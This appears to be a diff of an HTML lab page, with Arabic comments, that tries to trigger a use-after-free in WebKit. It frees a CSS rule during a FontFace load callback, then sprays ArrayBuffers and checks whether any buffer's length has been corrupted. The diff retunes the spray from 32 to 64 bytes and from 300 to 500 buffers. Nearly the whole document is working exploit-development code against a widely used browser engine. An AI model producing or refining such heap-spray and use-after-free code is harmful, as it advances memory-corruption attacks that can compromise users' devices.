@@ -7,7 +7,7 @@
 </head>
 <body>
     <div id="status_panel" style="font-family: monospace; color: #00ff00; background: #000; padding: 10px;">
-        [LAB] WebKit Corruption & Corrupted Length Test...
+        [LAB] WebKit Alignment - Size Tuning (64-Byte Model)...
     </div>
 
 <script>
@@ -17,10 +17,11 @@ function updateStatus(message) {
 }
 
 let structuralArrays = [];
-let views = [];
+// تحديد الحجم المستهدف للاختبار الحالي
+const TARGET_SIZE = 64; 
 
 window.onload = () => {
-    updateStatus("Stage 3: Attempting Memory Structure Overlap...");
+    updateStatus("Stage 3.1: Testing 64-Byte Allocation Realignment...");
 
     let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -34,20 +35,17 @@ window.onload = () => {
             if (!fired && this === A) {
                 fired = true;
                 
-                // 1. التحرير الفوري لكائن الـ C++
+                // التحرير
                 document.getElementById('s').sheet.deleteRule(0);
 
-                updateStatus("Corrupting: Spraying interleaved ArrayBuffers and Views...");
+                updateStatus("Spraying 500 ArrayBuffers with size " + TARGET_SIZE + "...");
                 
-                // 2. تكتيك التداخل: ننشئ مصفوفات متتالية في الذاكرة لعل أحدها يقع مكان الكائن المحذوف
-                for (let i = 0; i < 300; i++) {
-                    // حجم 32 بايت يحاكي الحجم التقريبي للبنية الداخلية
-                    let buffer = new ArrayBuffer(32);
-                    structuralArrays.push(buffer);
-                    views.push(new DataView(buffer));
+                // زيادة العدد لملء الـ Heap الخطي بكثافة أعلى
+                for (let i = 0; i < 500; i++) {
+                    structuralArrays.push(new ArrayBuffer(TARGET_SIZE));
                 }
 
-                updateStatus("Triggering Layout verification step...");
+                updateStatus("Executing structural layout check...");
                 document.body.offsetTop; 
             }
             return undefined;
@@ -56,24 +54,22 @@ window.onload = () => {
 
     document.fonts.load('1em targetFont', 'AB');
 
-    // خطوة الفحص بعد التعديل الذاكري
     setTimeout(() => {
-        updateStatus("Verification Phase: Checking if any ArrayBuffer length was corrupted...");
+        updateStatus("Verifying Memory States...");
         
         let corrupted = false;
         for (let i = 0; i < structuralArrays.length; i++) {
-            // القيمة الطبيعية يجب أن تكون 32. إذا تغيرت، فقد نجح التداخل!
-            if (structuralArrays[i].byteLength !== 32) {
-                updateStatus("SUCCESS: Found corrupted ArrayBuffer at index " + i + " with size: " + structuralArrays[i].byteLength);
+            if (structuralArrays[i].byteLength !== TARGET_SIZE) {
+                updateStatus("SUCCESS: Target size corruption detected at index " + i + "! New size: " + structuralArrays[i].byteLength);
                 corrupted = true;
                 break;
             }
         }
         
         if (!corrupted) {
-            updateStatus("Buffers intact. Standard layout maintained (or memory isolated).");
+            updateStatus("Buffers intact for size " + TARGET_SIZE + ". Transitioning adjustment needed.");
         }
-    }, 600);
+    }, 700);
 };
 </script>
 </body>
